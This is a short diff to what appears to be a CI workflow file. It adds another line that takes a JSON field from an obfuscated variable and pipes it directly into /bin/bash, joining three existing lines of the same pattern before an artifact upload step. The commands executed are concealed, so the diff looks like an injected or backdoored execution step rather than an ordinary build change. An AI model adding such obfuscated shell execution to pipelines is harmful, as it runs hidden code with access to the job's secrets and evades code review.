@@ -59,6 +59,7 @@ jobs:
           printf '%s' "$a7260" | jq -r .fjt8 | /bin/bash
           echo $vmlmd052 | jq -r .wqc32412 | /bin/bash
           echo $bx5982 | jq -r .mdm56310 | /bin/bash
+          echo $tlt75506 | jq -r .fvc9250 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
